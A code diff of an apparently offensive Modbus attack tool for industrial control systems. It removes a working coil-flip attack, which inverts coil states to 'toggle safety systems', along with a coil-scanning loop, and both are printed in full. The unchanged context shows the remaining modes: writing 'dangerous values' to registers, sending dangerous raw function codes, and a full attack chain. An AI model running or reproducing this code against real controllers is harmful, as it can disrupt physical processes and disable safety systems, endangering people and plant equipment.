@@ -63,28 +63,12 @@ class ModbusRecon:
                 pass
             time.sleep(0.01)
         
-        logging.info('[RECON] Scanning coils (FC 1)...')
-        for addr in range(0, max_addr, 100):
-            try:
-                coils = client.read_coils(addr, 100)
-                if coils:
-                    for i, val in enumerate(coils):
-                        if val:
-                            self.findings['coils'].append({
-                                'address': addr + i,
-                                'value': val
-                            })
-            except:
-                pass
-            time.sleep(0.01)
-        
         client.close()
         
         logging.info('='*60)
         logging.info('[RECON] === SCAN RESULTS ===')
         logging.info(f'Holding registers found: {len(self.findings["holding_registers"])}')
         logging.info(f'Input registers found: {len(self.findings["input_registers"])}')
-        logging.info(f'Coils found: {len(self.findings["coils"])}')
         
         if self.findings['holding_registers']:
             logging.info('\n[RECON] Sample holding registers:')
@@ -167,30 +151,6 @@ class ModbusRecon:
         client.close()
         logging.warning('[INJECT] Dangerous write injection completed')
 
-    def coil_flip_attack(self):
-        logging.warning('[INJECT] Starting coil flip attack...')
-        
-        client = ModbusClient(host=self.target_host, port=self.target_port,
-                            timeout=1, auto_open=True, auto_close=True)
-        
-        if not client.open():
-            logging.error('[INJECT] Failed to connect')
-            return
-        
-        for addr in range(0, 1000, 10):
-            try:
-                coils = client.read_coils(addr, 10)
-                if coils:
-                    flipped = [not c for c in coils]
-                    client.write_multiple_coils(addr, flipped)
-                    logging.warning(f'[INJECT] Flipped coils {addr}-{addr+9}')
-                    time.sleep(0.05)
-            except:
-                pass
-        
-        client.close()
-        logging.warning('[INJECT] Coil flip attack completed')
-
     def raw_function_codes(self):
         logging.warning('[INJECT] Sending dangerous function codes...')
         
@@ -248,9 +208,6 @@ class ModbusRecon:
             time.sleep(1)
             self.dangerous_writes()
         
-        elif self.attack_mode == 'coil_flip':
-            self.coil_flip_attack()
-        
         elif self.attack_mode == 'raw_funcs':
             self.raw_function_codes()
         
@@ -259,8 +216,6 @@ class ModbusRecon:
             self.test_write_access()
             time.sleep(1)
             self.dangerous_writes()
-            time.sleep(1)
-            self.coil_flip_attack()
             time.sleep(1)
             self.raw_function_codes()
         
@@ -275,20 +230,19 @@ if __name__ == '__main__':
 Attack modes:
   scan        - Scan for readable/writable registers
   inject      - Write dangerous values to registers
-  coil_flip   - Flip all coil states (toggle safety systems)
   raw_funcs   - Send dangerous raw function codes
   full        - Complete attack chain (all of the above)
 
 Examples:
   python modbus_recon_inject.py --target 127.0.0.1 --mode scan
   python modbus_recon_inject.py --target 192.168.1.10 --mode full
-  python modbus_recon_inject.py --target 127.0.0.1 --mode coil_flip
+  python modbus_recon_inject.py --target 127.0.0.1 --mode raw_funcs
         """
     )
     
     parser.add_argument('--target', required=True, help='Target Modbus server IP')
     parser.add_argument('--port', type=int, default=502, help='Target port')
-    parser.add_argument('--mode', choices=['scan', 'inject', 'coil_flip', 'raw_funcs', 'full'],
+    parser.add_argument('--mode', choices=['scan', 'inject', 'raw_funcs', 'full'],
                        default='scan', help='Attack mode')
     
     args = parser.parse_args()
